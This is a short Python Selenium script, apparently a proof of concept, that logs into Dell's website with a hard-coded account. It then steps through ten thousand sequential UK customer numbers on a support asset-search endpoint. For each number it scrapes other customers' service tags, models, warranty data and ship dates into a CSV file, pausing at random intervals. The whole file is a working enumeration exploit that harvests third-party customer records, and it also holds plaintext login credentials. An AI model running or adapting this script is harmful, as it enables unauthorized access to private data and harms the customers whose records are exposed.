#Credits/ Sensaze
#Not for illegal or illegitimate use, do not abuse.

from undetected_chromedriver import Chrome, ChromeOptions
from selenium import webdriver
import random, time, json, re

opts = ChromeOptions()
opts.add_argument('--log-level=3')
opts.add_argument('--headless')

email = "DellPoC@dayafterexploit.uk"
password = "D4yAft3r3Xpl01t"
def run():
    driver = Chrome(options=opts)
    driver.get("https://www.dell.com/Identity/global/LoginOrRegister/")
    driver.implicitly_wait(3)
    driver.find_element_by_id("EmailAddress").send_keys(email)
    driver.find_element_by_id("Password").send_keys(password)
    driver.find_element_by_id("sign-in-button").click()
    driver.implicitly_wait(2)
    time.sleep(1.5)
    for customerno in range(14930593, 14940593):
        driver.get(
            'https://www.dell.com/support/Assets-Online/uk/en/ukdhs1/FindAddProduct/ProcessSearchResult?BUID=202&IsWEN=false&SearchId=&findByValue=GB' + str(customerno) + '&isNewSearch=true&pageNumber=1&pageSize=100&selectedCountry=UK_202&selectedOption=CustomerNumber&sortColumn=ServiceTagNumber&sortOrder=true')
        driver.implicitly_wait(1.5)
        time.sleep(random.randint(3,5))
        data = driver.page_source
        filtered = re.search('pre-wrap;">(.*)</pre>', data)
        data2 = filtered.group(1)
        jsondata = json.loads(data2)
        if 'ServiceTag":"' in data2:
            totalproducts = (jsondata["data"]["TotalRecord"])
            models = [element["SystemModel"] for element in jsondata["data"]["MplAssets"]]
            tags = [element["ServiceTag"] for element in jsondata["data"]["MplAssets"]]
            warranties = [element["WarrantyService"] for element in jsondata["data"]["MplAssets"]]
            shippingdates = [element["ShipDateDisplay"] for element in jsondata["data"]["MplAssets"]]
            days = [element["DynamicAsset"]["DaysRemaining"] for element in jsondata["data"]["MplAssets"]]
            print("Customer found, added GB" + str(customerno))
            f = open("service_tags.csv", "a")
            #tags = re.sub(r'\[\[(?:[^\]|]*\|)?([^\]|]*)\]\]', r'\1', str(tags))
            f.write("GB" + str(customerno) + "," + str(tags)[2:-2] + "\n")
            time.sleep(1)
    driver.quit()

